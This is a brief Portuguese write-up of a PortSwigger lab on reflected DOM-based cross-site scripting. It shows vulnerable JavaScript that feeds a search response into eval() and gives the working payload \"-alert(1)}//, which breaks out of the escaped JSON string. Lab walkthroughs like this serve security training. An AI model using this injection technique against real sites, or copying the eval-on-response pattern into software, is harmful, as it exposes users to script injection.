#ctf 

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected


Ao fazer a requisição pesquisando por algo na barra de busca, o servidor retorna um JSON refletindo o que foi pesquisado

```json
{
"searchTerm": "resultado",
"results": []
}
```

E essa strings refletida é jogada para um `eval()`.

```javascript
var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();
```

Com isso basta escapar do JSON. Se eu adiciono aspas duplas para fechar do `searchTerm` o JSON coloca uma barra invertida antes delas mas se eu adicionar `\"` eu consigo fechar o valor. Agora preciso colocar o `alert()` colocando `-` para separar da expressão antes, fechar o colchete e comentar o resto.

```
\"-alert(1)}//
```

Assim que ficou o resultado do JSON:

```JSON
{"searchTerm":"\\"-alert(1)}//", "results":[]}
```

GG